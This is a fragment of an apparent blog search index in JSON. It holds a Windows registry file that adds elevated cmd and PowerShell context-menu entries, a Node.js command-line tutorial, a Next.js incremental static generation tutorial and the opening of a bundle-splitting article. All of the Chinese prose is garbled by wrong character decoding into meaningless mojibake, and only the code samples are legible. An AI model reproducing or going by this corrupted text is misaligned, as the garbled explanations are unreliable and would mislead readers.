\\\u0026#34;%V\\\u0026#34;\u0026#34; ; 2.å³é”®ï¼šå‘½ä»¤è¡Œï¼ˆç®¡ç†å‘˜ï¼‰\r[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas]\r@=\u0026#34;åœ¨æ­¤å¤„æ‰“å¼€å‘½ä»¤è¡Œçª—å£(ç®¡ç†å‘˜)\u0026#34;\r\u0026#34;ShowBasedOnVelocityId\u0026#34;=dword:00639bc8\r[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas\\command]\r@=\u0026#34;cmd.exe /s /k pushd \\\u0026#34;%V\\\u0026#34;\u0026#34;\r; 3.shift+å³é”®ï¼šPowershell(ç®¡ç†å‘˜)\r[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\PowershellAdmin]\r@=\u0026#34;åœ¨æ­¤å¤„æ‰“å¼€ Powershell çª—å£(ç®¡ç†å‘˜)\u0026#34;\r\u0026#34;Extended\u0026#34;=\u0026#34;\u0026#34;\r[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\PowershellAdmin\\command]\r@=\u0026#34;\\\u0026#34;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\u0026#34; -windowstyle hidden -Command $stpath = pwd; Start-Process PowerShell -ArgumentList \\\\\\\u0026#34;-NoExit\\\\\\\u0026#34;, \\\\\\\u0026#34;-Command Set-Location -literalPath \u0026#39;%V\u0026#39;\\\\\\\u0026#34; -verb RunAs\u0026#34;\r; 4.è®¾ç½®å³é”® ç®¡ç†å‘˜æ‰“å¼€cmdçš„å¦ä¸€ç§æ–¹æ³•ï¼ˆå¯ç”¨æ¥æ›¿æ¢ä¸Šé¢çš„2ï¼‰\r; é€šè¿‡Powershellè°ƒèµ·ï¼Œä¼šé—ªè¿‡ä¸€æ¬¡Powershellçš„çª—å£ï¼Œå»æ‰ä¸‹é¢å‡ è¡Œçš„[; ]å¯ä»¥å–æ¶ˆæ³¨é‡Š\r; [-HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\OpenCmdHereAdmin]\r; ; [HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\OpenCmdHereAdmin]\r; @=\u0026#34;åœ¨æ­¤å¤„æ‰“å¼€å‘½ä»¤è¡Œçª—å£(ç®¡ç†å‘˜)\u0026#34;\r; ; [HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\OpenCmdHereAdmin\\command]\r; @=\u0026#34;PowerShell -windowstyle hidden -Command \\\u0026#34;Start-Process cmd.exe -ArgumentList \u0026#39;/s,/k, pushd,%V\u0026#39; -Verb RunAs\\\u0026#34;\u0026#34; ","description":"","id":103,"section":"others","tags":null,"title":"å³é”®æ·»åŠ cmdå’Œpslçª—å£å‘½ä»¤","uri":"https://codthing.github.io/others/cmd/cmdpsl/"},{"content":"ä¸€ã€ä»å‘½ä»¤è¡Œæ¥å—å‚æ•° åœ¨è°ƒç”¨ Node.js åº”ç”¨ç¨‹åºæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä»»æ„æ•°é‡çš„å‚æ•°\nå‚æ•°å¯ä»¥æ˜¯ç‹¬ç«‹çš„ï¼Œä¹Ÿå¯ä»¥æœ‰ä¸€ä¸ªé”®å’Œä¸€ä¸ªå€¼ã€‚\n1 2 3 4 5 6  node app.js joe // or  node app.js name=joe   è¿™ä¼šæ”¹å˜ Node.js ä»£ç ä¸­æ£€ç´¢æ­¤å€¼çš„æ–¹å¼ã€‚\næ£€ç´¢å®ƒçš„æ–¹å¼æ˜¯ä½¿ç”¨ Node.js ä¸­å†…ç½®çš„ process å¯¹è±¡ã€‚\nå®ƒå…¬å¼€äº†ä¸€ä¸ª argv å±æ€§ï¼Œè¿™æ˜¯ä¸€ä¸ªåŒ…å«æ‰€æœ‰å‘½ä»¤è¡Œè°ƒç”¨å‚æ•°çš„æ•°ç»„ã€‚\nç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯èŠ‚ç‚¹å‘½ä»¤çš„å®Œæ•´è·¯å¾„ã€‚\nç¬¬äºŒä¸ªå…ƒç´ æ˜¯æ­£åœ¨æ‰§è¡Œçš„æ–‡ä»¶çš„å®Œæ•´è·¯å¾„ã€‚\næ‰€æœ‰é™„åŠ å‚æ•°éƒ½ä»ç¬¬ä¸‰ä¸ªä½ç½®å¼€å§‹ã€‚\nå¯ä»¥ä½¿ç”¨å¾ªç¯éå†æ‰€æœ‰å‚æ•°ï¼ˆåŒ…æ‹¬èŠ‚ç‚¹è·¯å¾„å’Œæ–‡ä»¶è·¯å¾„ï¼‰ï¼š\n1 2 3 4  process.argv.forEach((val, index) =\u0026gt; { console.log(`${index}: ${val}`) })   å¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ªæ’é™¤å‰ 2 ä¸ªå‚æ•°çš„æ–°æ•°ç»„æ¥ä»…è·å–é™„åŠ å‚æ•°ï¼š\n1 2  const args = process.argv.slice(2)   å¦‚æœæœ‰ä¸€ä¸ªæ²¡æœ‰ç´¢å¼•åç§°çš„å‚æ•°ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\n1 2 3 4 5 6  node app.js joe // éœ€è¦è¿™æ ·å­è®¿é—®å®ƒ const args = process.argv.slice(2) args[0]   args[0] æ˜¯ name=joeï¼Œéœ€è¦è§£æå®ƒã€‚ æœ€å¥½çš„æ–¹æ³•æ˜¯ä½¿ç”¨ minimist åº“ï¼Œå®ƒæœ‰åŠ©äºå¤„ç†å‚æ•°ï¼š\n1 2  node app.js name=joe   1 2  yarn add minimist   éœ€è¦åœ¨æ¯ä¸ªå‚æ•°åç§°å‰ä½¿ç”¨åŒç ´æŠ˜å·ï¼š\n1 2  node app.js --name=joe   \räºŒã€è¾“å‡ºåˆ°å‘½ä»¤è¡Œ 1. ä½¿ç”¨ console.log() çš„åŸºæœ¬è¾“å‡º Node.js æä¾›äº†ä¸€ä¸ªconsoleæ¨¡å—ï¼Œå®ƒæä¾›äº†å¤§é‡éå¸¸æœ‰ç”¨çš„æ–¹å¼æ¥ä¸å‘½ä»¤è¡Œäº¤äº’ã€‚\n1 2 3 4  const x = \u0026#39;x\u0026#39; const y = \u0026#39;y\u0026#39; console.log(x, y)   è¿˜å¯ä»¥é€šè¿‡ä¼ é€’å˜é‡å’Œæ ¼å¼è¯´æ˜ç¬¦æ¥æ ¼å¼åŒ–æ¼‚äº®çš„çŸ­è¯­ã€‚\n1 2  console.log(\u0026#39;My %s has %d years\u0026#39;, \u0026#39;cat\u0026#39;, 2)    %s å°†å˜é‡æ ¼å¼åŒ–ä¸ºå­—ç¬¦ä¸² %d å°†å˜é‡æ ¼å¼åŒ–ä¸ºæ•°å­— %i ä»…å°†å˜é‡æ ¼å¼åŒ–ä¸ºå…¶æ•´æ•°éƒ¨åˆ† %o å°†å˜é‡æ ¼å¼åŒ–ä¸ºå¯¹è±¡  1 2  console.log(\u0026#39;%o\u0026#39;, Number)   2. æ¸…é™¤ console.clear() console.clear()\næ¸…é™¤æ§åˆ¶å°ï¼ˆè¡Œä¸ºå¯èƒ½å–å†³äºæ‰€ä½¿ç”¨çš„æ§åˆ¶å°ï¼‰\n3. è®¡æ•° console.count() console.count() æ˜¯ä¸€ä¸ªæ–¹ä¾¿çš„æ–¹æ³•ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  const x = 1 const y = 2 const z = 3 console.count( \u0026#39;The value of x is \u0026#39; + x + \u0026#39; and has been checked .. how many times?\u0026#39; ) console.count( \u0026#39;The value of x is \u0026#39; + x + \u0026#39; and has been checked .. how many times?\u0026#39; ) console.count( \u0026#39;The value of y is \u0026#39; + y + \u0026#39; and has been checked .. how many times?\u0026#39; ) // The value of x is 1 and has been checked .. how many times?: 1 // The value of x is 1 and has been checked .. how many times?: 2 // The value of y is 2 and has been checked .. how many times?: 1   1 2 3 4 5 6 7 8 9  const oranges = [\u0026#39;orange\u0026#39;, \u0026#39;orange\u0026#39;] const apples = [\u0026#39;just one apple\u0026#39;] oranges.forEach(fruit =\u0026gt; { console.count(fruit) }) apples.forEach(fruit =\u0026gt; { console.count(fruit) })   4. é‡ç½®è®¡æ•° console.countReset() 1 2  console.countReset(\u0026#39;orange\u0026#39;)   5. æ‰“å°å †æ ˆè·Ÿè¸ª console.trace() 1 2 3 4  const function2 = () =\u0026gt; console.trace() const function1 = () =\u0026gt; function2() function1()   1 2 3 4 5 6 7 8 9 10 11 12  Trace at function2 (repl:1:33) at function1 (repl:1:25) at repl:1:1 at ContextifyScript.Script.runInThisContext (vm.js:44:33) at REPLServer.defaultEval (repl.js:239:29) at bound (domain.js:301:14) at REPLServer.runBound [as eval] (domain.js:314:12) at REPLServer.onLine (repl.js:440:10) at emitOne (events.js:120:20) at REPLServer.emit (events.js:210:7)   6. è®¡ç®—èŠ±è´¹çš„æ—¶é—´ time() timeEnd() 1 2 3 4 5 6 7 8 9  const doSomething = () =\u0026gt; console.log(\u0026#39;test\u0026#39;) const measureDoingSomething = () =\u0026gt; { console.time(\u0026#39;doSomething()\u0026#39;) //do something, and measure the time it takes  doSomething() console.timeEnd(\u0026#39;doSomething()\u0026#39;) } measureDoingSomething()   7. æ ‡å‡†è¾“å‡º console.log å’Œæ ‡å‡†é”™è¯¯ console.error console.log éå¸¸é€‚åˆåœ¨æ§åˆ¶å°ä¸­æ‰“å°æ¶ˆæ¯ã€‚è¿™å°±æ˜¯æ‰€è°“çš„æ ‡å‡†è¾“å‡ºï¼Œæˆ– stdout.\nconsole.error æ‰“å°åˆ° stderr æµã€‚\nå®ƒä¸ä¼šå‡ºç°åœ¨æ§åˆ¶å°ä¸­ï¼Œä½†ä¼šå‡ºç°åœ¨é”™è¯¯æ—¥å¿—ä¸­ã€‚\n8. ä¸ºè¾“å‡ºç€è‰² chalk 1 2  console.log(\u0026#39;\\x1b[33m%s\\x1b[0m\u0026#39;, \u0026#39;hi!\u0026#39;)   hi! ä»¥é»„è‰²æ‰“å°ã€‚\nä½†æ˜¯ï¼Œè¿™æ˜¯æ‰§è¡Œæ­¤æ“ä½œçš„ä½çº§æ–¹æ³•ã€‚ä¸ºæ§åˆ¶å°è¾“å‡ºç€è‰²çš„æœ€ç®€å•æ–¹æ³•æ˜¯ä½¿ç”¨åº“ã€‚Chalk å°±æ˜¯è¿™æ ·ä¸€ä¸ªåº“ï¼Œé™¤äº†ç€è‰²ä¹‹å¤–ï¼Œå®ƒè¿˜æœ‰åŠ©äºå…¶ä»–æ ·å¼å·¥å…·ï¼Œä¾‹å¦‚ä½¿æ–‡æœ¬åŠ ç²—ã€æ–œä½“æˆ–ä¸‹åˆ’çº¿ã€‚\n1 2 3  const chalk = require(\u0026#39;chalk\u0026#39;) console.log(chalk.yellow(\u0026#39;hi!\u0026#39;))   ä½¿ç”¨ chalk.yellow èµ·æ¥æ¯”è¯•å›¾è®°ä½è½¬ä¹‰ç è¦æ–¹ä¾¿å¾—å¤šï¼Œè€Œä¸”ä»£ç çš„å¯è¯»æ€§è¦å¼ºå¾—å¤š\n9. åˆ›å»ºè¿›åº¦æ¡ progress Progressæ˜¯ä¸€ä¸ªå¾ˆæ£’çš„åŒ…ï¼Œç”¨äºåœ¨æ§åˆ¶å°ä¸­åˆ›å»ºè¿›åº¦æ¡ã€‚å®‰è£…å®ƒä½¿ç”¨npm install progress\næ­¤ä»£ç æ®µåˆ›å»ºäº†ä¸€ä¸ª 10 æ­¥è¿›åº¦æ¡ï¼Œæ¯ 100 æ¯«ç§’å®Œæˆä¸€ä¸ªæ­¥éª¤ã€‚å½“æŸ±çº¿å®Œæˆæ—¶ï¼Œæˆ‘ä»¬æ¸…é™¤é—´éš”ï¼š\n1 2 3 4 5 6 7 8 9 10  const ProgressBar = require(\u0026#39;progress\u0026#39;) const bar = new ProgressBar(\u0026#39;:bar\u0026#39;, { total: 10 }) const timer = setInterval(() =\u0026gt; { bar.tick() if (bar.complete) { clearInterval(timer) } }, 100)   \rä¸‰ã€æ¥å—å‘½ä»¤è¡Œçš„è¾“å…¥ ä½¿ Node.js CLI ç¨‹åºå…·æœ‰äº¤äº’æ€§\nyarn add inquirer\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  const inquirer = require(\u0026#39;inquirer\u0026#39;) var questions = [ { type: \u0026#39;input\u0026#39;, name: \u0026#39;name\u0026#39;, message: \u0026#34;What\u0026#39;s your name?\u0026#34; } ] inquirer.prompt(questions).then(answers =\u0026gt; { console.log(`Hi ${answers[\u0026#39;name\u0026#39;]}!`) })   Inquirer.js å¯ä»¥è®©ä½ åšå¾ˆå¤šäº‹æƒ…ï¼Œæ¯”å¦‚è¯¢é—®å¤šé¡¹é€‰æ‹©ã€æœ‰å•é€‰æŒ‰é’®ã€ç¡®è®¤ç­‰ç­‰ã€‚\näº†è§£æ‰€æœ‰æ›¿ä»£æ–¹æ¡ˆæ˜¯å€¼å¾—çš„ï¼Œå°¤å…¶æ˜¯ Node.js æä¾›çš„å†…ç½®æ›¿ä»£æ–¹æ¡ˆï¼Œä½†å¦‚æœæ‚¨æ‰“ç®—å°† CLI è¾“å…¥æå‡åˆ°ä¸€ä¸ªæ–°çš„æ°´å¹³ï¼ŒInquirer.js æ˜¯æœ€ä½³é€‰æ‹©ã€‚\n","description":"","id":104,"section":"nodejs","tags":null,"title":"å‘½ä»¤è¡Œ","uri":"https://codthing.github.io/nodejs/nodebase/node-cmd/"},{"content":"é™æ€ç”Ÿæˆ (SSG) è§£å†³äº† SSR å’Œ CSR çš„å¤§éƒ¨åˆ†é—®é¢˜ï¼Œä½†é€‚ç”¨äºæ¸²æŸ“å¤§éƒ¨åˆ†é™æ€å†…å®¹ã€‚\nå½“è¦å‘ˆç°çš„å†…å®¹æ˜¯åŠ¨æ€çš„æˆ–ç»å¸¸å˜åŒ–æ—¶ï¼Œå®ƒä¼šé€ æˆé™åˆ¶ã€‚\næƒ³æƒ³ä¸€ä¸ªæœ‰å¤šä¸ªå¸–å­çš„ä¸æ–­å¢é•¿çš„åšå®¢ã€‚ æ‚¨ä¸å¯èƒ½ä»…ä»…å› ä¸ºæƒ³è¦æ›´æ­£å…¶ä¸­ä¸€ç¯‡æ–‡ç« ä¸­çš„é”™å­—è€Œæƒ³è¦é‡å»ºå’Œé‡æ–°éƒ¨ç½²ç«™ç‚¹ã€‚\nåŒæ ·ï¼Œä¸€ç¯‡æ–°çš„åšå®¢æ–‡ç« ä¹Ÿä¸åº”è¯¥éœ€è¦å¯¹æ‰€æœ‰ç°æœ‰é¡µé¢è¿›è¡Œé‡å»ºã€‚\nå› æ­¤ï¼Œå•é  SSG ä¸è¶³ä»¥æ¸²æŸ“å¤§å‹ç½‘ç«™æˆ–åº”ç”¨ç¨‹åºã€‚\nå¢é‡é™æ€ç”Ÿæˆ (iSSG) æ¨¡å¼æ˜¯ä½œä¸º SSG çš„å‡çº§å¼•å…¥çš„ï¼Œä»¥å¸®åŠ©è§£å†³åŠ¨æ€æ•°æ®é—®é¢˜å¹¶å¸®åŠ©é™æ€ç«™ç‚¹é’ˆå¯¹å¤§é‡é¢‘ç¹å˜åŒ–çš„æ•°æ®è¿›è¡Œæ‰©å±•ã€‚\niSSG å…è®¸é€šè¿‡åœ¨åå°é¢„æ¸²æŸ“é¡µé¢å­é›†æ¥æ›´æ–°ç°æœ‰é¡µé¢å¹¶æ·»åŠ æ–°é¡µé¢ï¼Œå³ä½¿æœ‰æ–°çš„é¡µé¢è¯·æ±‚è¿›å…¥ä¹Ÿæ˜¯å¦‚æ­¤ã€‚\n\riSSG - ç¤ºä¾‹ä»£ç  iSSG åœ¨ä¸¤ä¸ªæ–¹é¢å·¥ä½œï¼Œåœ¨ç°æœ‰é™æ€ç«™ç‚¹å»ºæˆåé€æ­¥å¼•å…¥æ›´æ–°ã€‚\n  å…è®¸æ·»åŠ æ–°é¡µé¢\n  å…è®¸æ›´æ–°ç°æœ‰é¡µé¢ï¼Œä¹Ÿç§°ä¸ºå¢é‡é™æ€â€œé‡æ–°â€ç”Ÿæˆ\n  æ·»åŠ æ–°é¡µé¢ å»¶è¿ŸåŠ è½½æ¦‚å¿µç”¨äºåœ¨æ„å»ºååœ¨ç½‘ç«™ä¸ŠåŒ…å«æ–°é¡µé¢ã€‚\nè¿™æ„å‘³ç€åœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚æ—¶ç«‹å³ç”Ÿæˆæ–°é¡µé¢ã€‚ åœ¨ç”Ÿæˆè¿‡ç¨‹ä¸­ï¼Œå¯ä»¥åœ¨å‰ç«¯å‘ç”¨æˆ·æ˜¾ç¤ºå›é€€é¡µé¢æˆ–åŠ è½½æŒ‡ç¤ºå™¨ã€‚\nå°†æ­¤ä¸å‰é¢é’ˆå¯¹æ¯ä¸ªäº§å“çš„å•ä¸ªè¯¦ç»†ä¿¡æ¯é¡µé¢è®¨è®ºçš„ SSG æ–¹æ¡ˆè¿›è¡Œæ¯”è¾ƒã€‚ 404 é”™è¯¯é¡µé¢åœ¨æ­¤å¤„æ˜¾ç¤ºä¸ºä¸å­˜åœ¨é¡µé¢çš„åå¤‡ã€‚\nç°åœ¨è®©æˆ‘ä»¬çœ‹çœ‹ä½¿ç”¨ iSSG å»¶è¿ŸåŠ è½½ä¸å­˜åœ¨çš„é¡µé¢æ‰€éœ€çš„ Next.js ä»£ç ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  // åœ¨ getStaticPaths() ä¸­ï¼Œéœ€è¦è¿”å›è¦åœ¨æ„å»ºæ—¶é¢„æ¸²æŸ“çš„äº§å“é¡µé¢ (/products/[id]) çš„ id åˆ—è¡¨ã€‚ // ä¸ºæ­¤ï¼Œå¯ä»¥ä»æ•°æ®åº“ä¸­è·å–æ‰€æœ‰äº§å“ã€‚ export async function getStaticPaths() { const products = await getProductsFromDatabase(); const paths = products.map((product) =\u0026gt; ({ params: { id: product.id } })); // fallback: true æ„å‘³ç€ä¸¢å¤±çš„é¡µé¢ä¸ä¼š 404ï¼Œè€Œæ˜¯å¯ä»¥æ¸²æŸ“å›é€€ã€‚  return { paths, fallback: true }; } // params å°†åŒ…å«æ¯ä¸ªç”Ÿæˆé¡µé¢çš„ idã€‚ export async function getStaticProps({ params }) { return { props: { product: await getProductFromDatabase(params.id) } } } export default function Product({ product }) { const router = useRouter(); if (router.isFallback) { return \u0026lt;div\u0026gt;Loading...\u0026lt;/div\u0026gt;; } // Render product }   åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨äº†å›é€€ï¼štrueã€‚\nç°åœ¨ï¼Œå¦‚æœä¸ç‰¹å®šäº§å“å¯¹åº”çš„é¡µé¢ä¸å¯ç”¨ï¼Œæˆ‘ä»¬ä¼šæ˜¾ç¤ºè¯¥é¡µé¢çš„åå¤‡ç‰ˆæœ¬ï¼Œä¾‹å¦‚ï¼Œå¦‚ä¸Šé¢çš„ Product å‡½æ•°ä¸­æ‰€ç¤ºçš„åŠ è½½æŒ‡ç¤ºå™¨ã€‚\nåŒæ—¶ï¼ŒNext.js ä¼šåœ¨åå°ç”Ÿæˆé¡µé¢ã€‚ ä¸€æ—¦ç”Ÿæˆï¼Œå®ƒå°†è¢«ç¼“å­˜å¹¶æ˜¾ç¤ºè€Œä¸æ˜¯å›é€€é¡µé¢ã€‚ è¯¥é¡µé¢çš„ç¼“å­˜ç‰ˆæœ¬ç°åœ¨å°†æ ¹æ®è¯·æ±‚ç«‹å³æ˜¾ç¤ºç»™ä»»ä½•åç»­è®¿é—®è€…ã€‚\nå¯¹äºæ–°é¡µé¢å’Œç°æœ‰é¡µé¢ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½® Next.js åº”è¯¥é‡æ–°éªŒè¯å’Œæ›´æ–°å®ƒçš„åˆ°æœŸæ—¶é—´ã€‚\nè¿™å¯ä»¥é€šè¿‡ä½¿ç”¨ revalidate å±æ€§æ¥å®ç°ï¼Œå¦‚ä¸‹ä¸€èŠ‚æ‰€ç¤ºã€‚\næ›´æ–°ç°æœ‰é¡µé¢ è¦é‡æ–°å‘ˆç°ç°æœ‰é¡µé¢ï¼Œéœ€è¦ä¸ºé¡µé¢å®šä¹‰åˆé€‚çš„è¶…æ—¶æ—¶é—´ã€‚ è¿™å°†ç¡®ä¿åœ¨å®šä¹‰çš„è¶…æ—¶æœŸé™è¿‡å»åé‡æ–°éªŒè¯é¡µé¢ã€‚\nè¶…æ—¶å¯ä»¥è®¾ç½®ä¸ºä½è‡³ 1 ç§’ã€‚ ç”¨æˆ·å°†ç»§ç»­çœ‹åˆ°é¡µé¢çš„å…ˆå‰ç‰ˆæœ¬ï¼Œç›´åˆ°é¡µé¢å®Œæˆé‡æ–°éªŒè¯ã€‚\nå› æ­¤ï¼ŒiSSG ä½¿ç”¨ stale-while-revalidate ç­–ç•¥ï¼Œå…¶ä¸­ç”¨æˆ·åœ¨é‡æ–°éªŒè¯æ—¶æ¥æ”¶ç¼“å­˜æˆ–è¿‡æ—¶çš„ç‰ˆæœ¬ã€‚ é‡æ–°éªŒè¯å®Œå…¨åœ¨åå°è¿›è¡Œï¼Œæ— éœ€å®Œå…¨é‡å»ºã€‚\nè®©æˆ‘ä»¬å›åˆ°åŸºäºæ•°æ®åº“ä¸­çš„æ•°æ®ä¸ºäº§å“ç”Ÿæˆé™æ€åˆ—è¡¨é¡µé¢çš„ç¤ºä¾‹ã€‚ ä¸ºäº†ä½¿å…¶æœåŠ¡äºç›¸å¯¹åŠ¨æ€çš„äº§å“åˆ—è¡¨ï¼Œå°†åŒ…å«è®¾ç½®é‡å»ºé¡µé¢è¶…æ—¶çš„ä»£ç ã€‚\nè¿™å°±æ˜¯åŒ…å«è¶…æ—¶åä»£ç çš„æ ·å­ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  // æ­¤å‡½æ•°åœ¨æ„å»ºæœåŠ¡å™¨ä¸Šè¿è¡Œ export async function getStaticProps() { return { props: { products: await getProductsFromDatabase(), revalidate: 60, // è¿™å°†å¼ºåˆ¶é¡µé¢åœ¨ 60 ç§’åé‡æ–°éªŒè¯  } } } // é¡µé¢ç»„ä»¶åœ¨æ„å»ºæ—¶ä» getStaticProps æ¥æ”¶ products å±æ€§ export default function Products({ products }) { return ( \u0026lt;\u0026gt; \u0026lt;h1\u0026gt;Products\u0026lt;/h1\u0026gt; \u0026lt;ul\u0026gt; {products.map((product) =\u0026gt; ( \u0026lt;li key={product.id}\u0026gt;{product.name}\u0026lt;/li\u0026gt; ))} \u0026lt;/ul\u0026gt; \u0026lt;/\u0026gt; ) }   åœ¨ 60 ç§’åé‡æ–°éªŒè¯é¡µé¢çš„ä»£ç åŒ…å«åœ¨ getStaticProps() å‡½æ•°ä¸­ã€‚ å½“è¯·æ±‚è¿›å…¥å¯ç”¨çš„é™æ€é¡µé¢æ—¶ï¼Œé¦–å…ˆæä¾›æœåŠ¡ã€‚\næ¯éš”ä¸€åˆ†é’Ÿï¼Œé™æ€é¡µé¢å°±ä¼šåœ¨åå°åˆ·æ–°æ–°æ•°æ®ã€‚ ç”Ÿæˆåï¼Œæ–°ç‰ˆæœ¬çš„é™æ€æ–‡ä»¶å°†å¯ç”¨ï¼Œå¹¶å°†åœ¨éšåçš„ä¸€åˆ†é’Ÿå†…ä¸ºä»»ä½•æ–°è¯·æ±‚æä¾›æœåŠ¡ã€‚\næ­¤åŠŸèƒ½åœ¨ Next.js 9.5 åŠæ›´é«˜ç‰ˆæœ¬ä¸­å¯ç”¨ã€‚\n\riSSG ä¼˜åŠ¿ iSSG æä¾›äº† SSG çš„æ‰€æœ‰ä¼˜åŠ¿ï¼Œä»¥åŠæ›´å¤šä¼˜åŠ¿ã€‚ ä»¥ä¸‹åˆ—è¡¨è¯¦ç»†ä»‹ç»äº†å®ƒä»¬ã€‚\n  åŠ¨æ€æ•°æ®ï¼š\nç¬¬ä¸€ä¸ªä¼˜åŠ¿æ˜¾ç„¶æ˜¯ä¸ºä»€ä¹ˆè¦è®¾æƒ³ iSSGã€‚ å®ƒèƒ½å¤Ÿæ”¯æŒåŠ¨æ€æ•°æ®è€Œæ— éœ€é‡å»ºç«™ç‚¹ã€‚\n  é€Ÿåº¦ï¼š\niSSG è‡³å°‘ä¸ SSG ä¸€æ ·å¿«ï¼Œå› ä¸ºæ•°æ®æ£€ç´¢å’Œæ¸²æŸ“ä»ç„¶åœ¨åå°è¿›è¡Œã€‚ å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨ä¸Šå‡ ä¹ä¸éœ€è¦å¤„ç†ã€‚\n  å¯ç”¨æ€§ï¼š\nä»»ä½•é¡µé¢çš„æœ€æ–°ç‰ˆæœ¬å°†å§‹ç»ˆåœ¨çº¿å¯ä¾›ç”¨æˆ·è®¿é—®ã€‚ å³ä½¿åœ¨åå°é‡æ–°ç”Ÿæˆå¤±è´¥ï¼Œæ—§ç‰ˆæœ¬ä»ç„¶ä¿æŒä¸å˜ã€‚\n  ä¸€è‡´ï¼š\nç”±äºæ¯æ¬¡åœ¨æœåŠ¡å™¨ä¸Šé‡æ–°ç”Ÿæˆä¸€é¡µï¼Œå› æ­¤æ•°æ®åº“å’Œåç«¯çš„è´Ÿè½½è¾ƒä½ä¸”æ€§èƒ½ä¸€è‡´ã€‚ å› æ­¤ï¼Œå»¶è¿Ÿæ²¡æœ‰å³°å€¼ã€‚\n  æ˜“äºåˆ†å‘ï¼š\nå°±åƒ SSG ç«™ç‚¹ä¸€æ ·ï¼ŒiSSG ç«™ç‚¹ä¹Ÿå¯ä»¥é€šè¿‡ç”¨äºæä¾›é¢„æ¸²æŸ“ç½‘é¡µçš„ CDN ç½‘ç»œè¿›è¡Œåˆ†å‘ã€‚\n  \rçŸ¥è¯†ç‚¹  getStaticPaths() fallback getStaticProps() revalidate  ","description":"å»ºç«‹ç½‘ç«™åæ›´æ–°é™æ€å†…å®¹","id":105,"section":"react-patterns","tags":null,"title":"å¢é‡é™æ€ç”Ÿæˆ âœ”","uri":"https://codthing.github.io/react-patterns/render-patterns/incremental-static-rendering/"},{"content":"åœ¨æ„å»ºç°ä»£ Web åº”ç”¨ç¨‹åºæ—¶ï¼Œ\nè¯¸å¦‚ Webpack æˆ– Rollup ä¹‹ç±»çš„æ‰“åŒ…å™¨ä¼šè·å–åº”ç”¨ç¨‹åºçš„æºä»£ç ï¼Œå¹¶å°†å…¶æ†ç»‘åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªåŒ…ä¸­ã€‚\nå½“ç”¨æˆ·è®¿é—®ç½‘ç«™æ—¶ï¼Œä¼šè¯·æ±‚å¹¶åŠ è½½åŒ…ï¼Œä»¥ä¾¿å°†æ•°æ®æ˜¾ç¤ºåˆ°ç”¨æˆ·çš„å±å¹•ä¸Šã€‚\nJavaScript å¼•æ“ï¼ˆå¦‚ V8ï¼‰èƒ½å¤Ÿè§£æå’Œç¼–è¯‘ç”¨æˆ·åœ¨åŠ è½½æ—¶è¯·æ±‚çš„æ•°æ®ã€‚\nå°½ç®¡ç°ä»£æµè§ˆå™¨å·²ç»å‘å±•ä¸ºå°½å¯èƒ½å¿«é€Ÿå’Œé«˜æ•ˆåœ°è§£æå’Œç¼–è¯‘ä»£ç ï¼Œä½†å¼€å‘äººå‘˜ä»ç„¶è´Ÿè´£ä¼˜åŒ–è¯¥è¿‡ç¨‹ä¸­çš„ä¸¤ä¸ªæ­¥éª¤ï¼š\n  è¯·æ±‚æ•°æ®çš„åŠ è½½æ—¶é—´å’Œæ‰§è¡Œæ—¶é—´ã€‚\n  ç¡®ä¿å°½å¯èƒ½ç¼©çŸ­æ‰§è¡Œæ—¶é—´ä»¥é˜²æ­¢é˜»å¡ä¸»çº¿ç¨‹ã€‚\n  å°½ç®¡ç°ä»£æµè§ˆå™¨èƒ½å¤Ÿåœ¨åŒ…åˆ°è¾¾æ—¶å¯¹å…¶è¿›è¡Œæµå¼ä¼ è¾“ï¼Œä½†åœ¨ç”¨æˆ·è®¾å¤‡ä¸Šç»˜åˆ¶ç¬¬ä¸€ä¸ªåƒç´ ä¹‹å‰ä»ç„¶éœ€è¦å¾ˆé•¿æ—¶é—´ã€‚\næ†ç»‘åŒ…è¶Šå¤§ï¼Œå¼•æ“åˆ°è¾¾ç¬¬ä¸€æ¬¡æ¸²æŸ“è°ƒç”¨æ‰€åœ¨çš„è¡Œæ‰€éœ€çš„æ—¶é—´å°±è¶Šé•¿ã€‚\nåœ¨é‚£ä¹‹å‰ï¼Œç”¨æˆ·å¿…é¡»ç›¯ç€ç©ºç™½å±å¹•å¾ˆé•¿ä¸€æ®µæ—¶é—´ï¼Œè¿™å¯èƒ½â€¦â€¦éå¸¸ä»¤äººæ²®ä¸§ï¼\næˆ‘ä»¬å¸Œæœ›å°½å¿«å‘ç”¨æˆ·æ˜¾ç¤ºæ•°æ®ã€‚\næ›´å¤§çš„åŒ…ä¼šå¯¼è‡´åŠ è½½æ—¶é—´ã€å¤„ç†æ—¶é—´å’Œæ‰§è¡Œæ—¶é—´å¢åŠ ã€‚\nå¦‚æœå¯ä»¥å‡å°‘è¿™ä¸ªåŒ…çš„å¤§å°ï¼Œä»¥åŠ å¿«é€Ÿåº¦ï¼Œé‚£å°±å¤ªå¥½äº†ã€‚\nå¯ä»¥å°†æ†ç»‘åŒ…æ‹†åˆ†ä¸ºå¤šä¸ªè¾ƒå°çš„æ†ç»‘åŒ…ï¼Œè€Œä¸æ˜¯è¯·æ±‚ä¸€ä¸ªåŒ…å«ä¸å¿…è¦ä»£ç 